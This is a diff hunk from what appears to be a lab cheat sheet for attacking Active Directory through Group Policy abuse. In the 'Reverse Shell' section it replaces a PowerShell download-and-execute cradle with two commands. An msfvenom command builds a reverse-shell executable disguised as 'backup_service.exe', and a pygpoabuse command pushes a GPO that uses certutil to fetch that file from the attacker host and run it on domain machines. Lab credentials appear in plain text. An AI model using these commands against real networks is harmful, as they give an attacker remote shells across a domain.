@@ -19,6 +19,8 @@ python3 pygpoabuse.py 'warzone.oxsium.local/ShadowOperator:Oxsium_Lab123!' -gpo-
 
 # GPO Manipulation 2 ( Reverse Shell )
 ```powershell
-python3 pygpoabuse.py 'warzone.oxsium.local/ShadowOperator:Oxsium_Lab123!' -gpo-name "GPO_ADINIZ" -powershell -command "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5/shell.ps1')" -dc-ip 192.168.1.10
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.241 LPORT=12000 -f exe -o backup_service.exe
+
+python3 pygpoabuse.py 'warzone.oxsium.local/ShadowOperator:Oxsium_Lab123!' -gpo-name "GPO_ADINIZ" -powershell -command "cmd /c certutil -urlcache -f http://192.168.0.241/backup_service.exe C:\Windows\Temp\svc.exe && C:\Windows\Temp\svc.exe"
 ```
 
